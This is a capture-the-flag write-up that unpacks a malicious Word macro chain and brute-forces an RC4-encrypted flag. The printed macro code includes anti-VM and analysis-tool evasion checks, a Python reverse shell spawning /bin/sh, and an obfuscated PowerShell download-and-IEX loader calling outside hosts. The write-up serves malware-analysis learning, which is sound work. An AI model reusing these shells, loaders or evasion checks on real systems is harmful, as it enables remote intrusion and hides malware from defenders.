Once again, we get a doc file, called "macroses.doc", which (should) say a lot about its content ...

However :

```
macroses.doc: ASCII text, with CRLF, LF line terminators
```

And indeed, the file contains something which looks like a mail attachment.

# The mail 

Just extract the content :

```bash
$ ripmime -i macroses.doc
```

We end with:

```
asdfdalasdfasd: ASCII text, with CRLF line terminators
danger.htm:     ASCII text, with CRLF line terminators
textfile0:      empty
```

if you look carefully the content of macroses.doc, you will notice that the
third part has no `Content-Location` header so the file has not been extracted.
Keep it for later.

`danger.htm` only contains:

```html
<link rel=Edit-Time-Data href="asdfdalasdfasd">
```

So it seems most interesting file is `asdfdalasdfasd`.

## asdfdalasdfasd 

First extract it :

```bash
$ dos2unix asdfdalasdfasd
$ base64 -d asdfdalasdfasd > asdfdalasdfasd.raw
$ file asdfdalasdfasd.raw
asdfdalasdfasd.raw: Data
```

And sadly, the content of `.raw` file is unreadable, except the first few chars : "ActiveMime". Running binwalk gives us some clue :

```bash
$ binwalk asdfdalasdfasd.raw

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
50            0x32            Zlib compressed data, default compression
```

So we extract the content and get a file called `32`:

```
32: Composite Document File V2 Document, Cannot read section info
```

Seems corrupted, but at least we have some info. As we are now used to extracting macro, just check :

```bash
olevba 32
olevba 0.51.1dev1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OLE:MASI-B-- 32
===============================================================================
FILE: 32
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: 32 - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub ViewVBCode()
    NONONONONONONONONONONONO
End Sub

Sub FileTemplates()
    NONONONONONONONONONONONO
End Sub

Sub ToolsMacro()
    NONONONONONONONONONONONO
End Sub
[...]
```

Nice, a macro ! 

# First macro 

So , this macro contains a basic anti-debug function :

```vbnet
Sub NONONONONONONONONONONONO()
    CallByName ActiveDocument, "SaveAs2", VbMethod, ActiveDocument.Path & "\\" & ActiveDocument.Name, 4
    ActiveDocument.Close wdDoNotSaveChanges
End Sub
```

This method is called in a few places :

```vbnet
Sub ViewVBCode()
    NONONONONONONONONONONONO
End Sub

Sub FileTemplates()
    NONONONONONONONONONONONO
End Sub

Sub ToolsMacro()
    NONONONONONONONONONONONO
End Sub
```

and in the `Main()`:

```vbnet
    d = False

    If WordBasic.AppCount() < 50 Then
        d = True
    End If

    tns = Array("vmware", "vmtools", "vbox", "process explorer", "processhacker", "procmon", "visual basic", "fiddler", "wireshark")
    bns = Array("virtualbox", "vmware")
    Set ws = GetObject("winmgmts:\\.\root\cimv2")

    Dim names() As String
    ReDim names(WordBasic.AppCount())
    WordBasic.AppGetNames names
    For Each n In names
        For Each tn In tns
            If InStr(LCase(n), tn) > 0 Then
                d = True
            End If
        Next
    Next

    Set qis = ws.ExecQuery("Select * from Win32_Processor", , 48)
    For Each i In qis
            If i.NumberOfCores < 3 Then
                d = True
            End If
    Next

    Set qis = ws.ExecQuery("Select * from Win32_Bios", , 48)
    For Each i In qis
        For Each bn In bns
            If InStr(LCase(i.SMBIOSBIOSVersion), bn) > 0 Then
                d = True
            End If
            If InStr(LCase(i.SerialNumber), bn) > 0 Then
                d = True
            End If
        Next
    Next

    Set qis = ws.ExecQuery("Select * from Win32_ComputerSystem", , 48)
    For Each i In qis
        If i.partOfDomain Then
            d = True
        End If
    Next

    If d Then
        NONONONONONONONONONONONO
        Exit Sub
    End If
```

So we can just skip all this stuff.

## Real payload

So the interesting stuff is mostly:

```vbnet
   offy = iffyoffy

    payload_size = 78508
    b64 = Replace(supersuper(offy), vbLf, "")
    b64 = Left(b64, payload_size)

    Dim rawlobster() As Byte
    rawlobster = bbbbb(b64)
    rawf = ActiveDocument.Path & "\\as8ja8sj3d.doc"
    FF = FreeFile
    Open rawf For Binary Access Write As #FF

    Put #FF, 1, rawlobster
    Close #FF
    Application.Documents.Open rawf
```

```vbnet
Function supersuper(iffy) As String
On Error Resume Next
   fp = ActiveDocument.Path & "\\" & ActiveDocument.Name
   Dim data As String
   Dim FF As Integer
   FF = FreeFile
    Open fp For Input As #FF

    Seek FF, iffy + 1
    supersuper = Input$(LOF(FF) - iffy, FF)
    Close 1
End Function

Function iffyoffy() As Long
    iffyoffy = ((CInt(Left(WordBasic.[GetSystemInfo$](25), 2)) \ 50) * 500) + ((WordBasic.[GetSystemInfo$](31) \ 768) * 1337) + ((WordBa
sic.[GetSystemInfo$](32) \ 1366) * 81175)
End Function
```

So what it does is basically that it opens the current file remove the `offy`
 first chars, and send the 78508 next chars to `bbbbb()`:

```vbnet
Private Function bbbbb(ByVal snakes As String) As Variant
    On Error Resume Next
    Set oo = CreateObject("MSXML2.DOMDocument")
    Set xx = oo.createElement("b64")
    xx.dataType = "bin.base64"
    xx.Text = snakes
    bbbb = xx.nodeTypedValue

    k = Asc(Mid(WordBasic.[GetSystemInfo$](30), 10, 1)) Xor Asc(Mid(WordBasic.[GetSystemInfo$](30), 17, 1))

    Dim pppp(58880) As Byte
    For iter = 0 To 58880
        pppp(iter) = bbbb(iter) Xor k
    Next
    bbbbb = pppp
End Function
```

Well, it just xor the whole base64 decoded result with one value, should be easy to find.
The text must be part of this 2nd base64 bloc we had at the end of
`macroses.doc`. Sadly, we don't really know which value iffyoffy will give us.

Also, there is a `digisdigis` function which seems to do nothing except
concatenate some random chars not used anywhere else.

# 2nd file

So, let's try to extract something that can be decoded as base64. We know it must be 78508 bytes long, so :

```bash
$ dd skip=19294 bs=1 if=macroses.doc  |tr -d '\n' |base64 -d
base64: invalid input
```

19556 is the offset to the beggining of this last base64 huge block. It does
not decode correctly as base64. Let's try with a bigger offset:

```bash
$ dd skip=19295 bs=1 if=macroses.doc  |tr -d '\n' |LC_ALL=C base64 -d  > as8ja8sj3d.doc.xored
```

w00t, worked. Not too bad. Now the xor part.

```bash
$ mkdir unxored
$ for i in $(seq 1 255); do xortool-xor -h $(printf "%02x" $i) -f as8ja8sj3d.doc.xored > unxored/as8ja8sj3d.doc.${i}.unxored ; done
```

Looking at the result of the `file` command, we don't see anything really interesting (except a wrongly detected zlib).
Data must be there ... So try harder with binwalk, I finally found:

```bash
$ binwalk unxored/as8ja8sj3d.doc.6.unxored

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
52636         0xCD9C          Zip archive data, at least v2.0 to extract, compressed size: 255, uncompressed size: 540, name: [Content_Types].xml
52940         0xCECC          Zip archive data, at least v2.0 to extract, compressed size: 192, uncompressed size: 310, name: _rels/.rels
53173         0xCFB5          Zip archive data, at least v2.0 to extract, compressed size: 131, uncompressed size: 138, name: theme/theme/themeManager.xml
53362         0xD072          Zip archive data, at least v2.0 to extract, compressed size: 1704, uncompressed size: 7076, name: theme/theme/theme1.xml
55118         0xD74E          Zip archive data, at least v2.0 to extract, compressed size: 182, uncompressed size: 283, name: theme/theme/_rels/themeManager.xml.rels
55718         0xD9A6          End of Zip archive
55740         0xD9BC          XML document, version: "1.0"
```

And even better with hachoir :

```bash
$ hachoir-subfile unxored/as8ja8sj3d.doc.6.unxored

[+] Start search on 106483 bytes (104.0 KB)

[+] File at 46602 size=58880 (57.5 KB): Microsoft Office document => out/file-0001.doc
[+] File at 52636 size=3104 (3104 bytes): ZIP archive => out/file-0002.zip

[+] End of search -- offset=106483 (104.0 KB)
```

So we just got a new doc file : 

```
out/file-0001.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: Windows User, Template: Normal.dotm, Last Saved By: Windows User, Revision Number: 10, Name of Creating Application: Microsoft Office Word, Total Editing Time: 02:46:00, Create Time/Date: Sat Mar 11 14:37:00 2017, Last Saved Time/Date: Fri May 12 18:49:00 2017, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0out/file-0001.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: Windows User, Template: Normal.dotm, Last Saved By: Windows User, Revision Number: 10, Name of Creating Application: Microsoft Office Word, Total Editing Time: 02:46:00, Create Time/Date: Sat Mar 11 14:37:00 2017, Last Saved Time/Date: Fri May 12 18:49:00 2017, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0
```

# Second macro

So, here we go again :

```bash
$ olevba -c file-0001.doc > file-0001.macro.vbs
```

What do we have in this macro :

 * a reverse shell 

```vbnet
Sub C64()
    On Error Resume Next
    Err.Clear
    scriptToRun = "do shell script ""python -c 'import urllib2,socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\""http://reversing.sg/fl4g.txt\"",80)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"",\""-i\""]);' &"""
    res = MacScript(scriptToRun)
End Sub
```

 * Some base64 encoded gzip stuff :

```vbnet
   lStr = lStr & "powershell -ep bypass -C ""$data = [System.Convert]::FromBase64String('H4sIAAAAAAAEAEWPYUvDMBCGvwv+h1EKS8DFoU5wozBsN+eQFZ1MaGehS88ZSRNIb12z0f9u0KEf733ufY7zj1kvawOfpK/QIJsorguhtu/DYV5xIdgD4BKNS0gaalWDQYemRpf3eQW3NyfWzWcvfR7p+ul6LotyZfmV3CV2cEjsXbSa6Dopm08392H2HHQppaPzM/+oWey1QfoYs0gY4KiNdXJ3MdwZAwr/UvK7vybjbEwv28A7ddcfMt8ybNBznCxg34s3X67SWdoKoWQLQPYGm1AKZ6Ms0nsldV5MhQTi/zx+0fnX0tE31FlVnA0BAAA=');$ms=New-Object System.IO.MemoryStream;$"
   lStr = lStr & "ms.Write($data,0,$data.Length);$ms.Seek(0,0)|Out-Null;$cs = New-Object System.IO.Compression.GZipStr"
   lStr = lStr & "eam($ms,[System.IO.Compression.CompressionMode]::Decompress);$sr=New-Object System.IO.StreamReader($"
   lStr = lStr & "cs);$t=$sr.readtoend();IEX $t;"""
```

The base64 string, once decoded & unzipped is :

```vbnet
${^-^}=$([Text.Encoding]::ascii.GetString([Convert]::FromBase64String('aHR0cDovL3JldmVyc2luZy5zZy9DVEovZmxhZy50eHQ=')));
${o.O"}=[IO.Directory]::GetCurrentDirectory();
${\(@^@)/}="${o.O"}\flag.txt";
(New-Object System.Net.WebClient).DownloadFile(${^-^}, ${\(@^@)/});
```

Oh, maybe the flag :
```bash
$ echo aHR0cDovL3JldmVyc2luZy5zZy9DVEovZmxhZy50eHQ= |base64 -d
http://reversing.sg/CTJ/flag.txt

$ curl http://reversing.sg/CTJ/flag.txt -L
75
```

No, of course not ... that would have been way too easy :/

 * A crypto function `ourseahorse()` which seems to build an array from a key, then xor the message with this array.

 * a request to http://enablemacroses.com , which returns 'TheFileIsCorrupted \x0A", which is used as key (yes, you must take the whole answer, including \x0A).

 * a comparison between a call to `ourseahorse()` and the expected result

So likely we need to find the sMessage which matchs the message. 2 ways here,
either reverse the algorithm or bruteforce it. Let's try to BF :)

## BF the flag

I felt too lazy to move this algorithm to python, so just write the small BF part we need in VB.

So here is my bf.vbs:

```vbnet
Option VBASupport 1
Private Const logFileAddress = "/tmp/flag.log"

Sub Main
bf()
End Sub

Sub Logg(Optional sMessage As String)
    Dim f1 As Integer

    if IsMissing(sMessage)  then ' delete all log data
    if FileExists(logFileAddress)  then Kill logFileAddress
    Exit Sub
    end if

    f1 = FreeFile
    Open logFileAddress For Append As #f1
    print #f1, Now & " : " & sMessage
    Close #f1
End Sub

Function ourseahorse(sMessage, strKey)
    Dim kLen, x, y, i, j, temp
    Dim s(256), k(256)
    kLen = Len(strKey)
    For i = 0 To 255
        s(i) = i
        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1))
    Next
    j = 0
    For i = 0 To 255
        j = (j + k(i) + s(i)) Mod 256
        temp = s(i)
        s(i) = s(j)
        s(j) = temp
    Next
    x = 0
    y = 0
    For i = 1 To 3072
        x = (x + 1) Mod 256
        y = (y + s(x)) Mod 256
        temp = s(x)
        s(x) = s(y)
        s(y) = temp
    Next
    For i = 1 To Len(sMessage)
        x = (x + 1) Mod 256
        y = (y + s(x)) Mod 256
        temp = s(x)
        s(x) = s(y)
        s(y) = temp

        ourseahorse = ourseahorse & (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) & ","
    Next
End Function

Private Sub BF()
    Dim oXMLHTTP As Object
    Dim sPageHTML  As String
    Dim sURL As String

    sKey = "TheFileIsCorrupted " & Chr(10)
    expected=Split("111,84,77,89,203,150,116,89,197,72,226,100,165,245,146,10,32,226,162,246,203,54,22,38,170,176,140,251,246,148,213,97,164,250,125,242,13,162,250,33,239,104,38,74,167,183,133,3,72,255,131,105,228,81,164,202,212,207,231,172,100,156,197,237,45,87,182,196,77",",")
    Dim res(69) As String

    For g = 0 To 68
      For k = 0 To 255
         res(g) = Chr(k)
         sMessage = Join(res,"")
         x = ourseahorse(sMessage, sKey)
         got = Split(x, ",")

         If got(g) = expected(g) Then
           Exit For
         End If
      Next
      Logg(Join(res,""))
    Next
    r = Join(res,"")
    If x = y Then
        MsgBox "Gratz"
    Else
        MsgBox "Try harder"
    End If
End Sub
```

Just run bf() function on Loffice macro, and watch your `/tmp/flag.log`:

```vbnet
tail -f /tmp/flag.log
26/07/2017 15:49:26 : P
26/07/2017 15:49:30 : PA
26/07/2017 15:49:36 : PAN
26/07/2017 15:49:44 : PAN{
26/07/2017 15:49:47 : PAN{6
26/07/2017 15:49:51 : PAN{68
26/07/2017 15:49:54 : PAN{681
26/07/2017 15:50:00 : PAN{681e
26/07/2017 15:50:07 : PAN{681eb
26/07/2017 15:50:13 : PAN{681ebc
26/07/2017 15:50:16 : PAN{681ebc6
26/07/2017 15:50:22 : PAN{681ebc6c
26/07/2017 15:50:26 : PAN{681ebc6c7
26/07/2017 15:50:29 : PAN{681ebc6c79
[...]
```

and after a few minutes you get your flag \o/
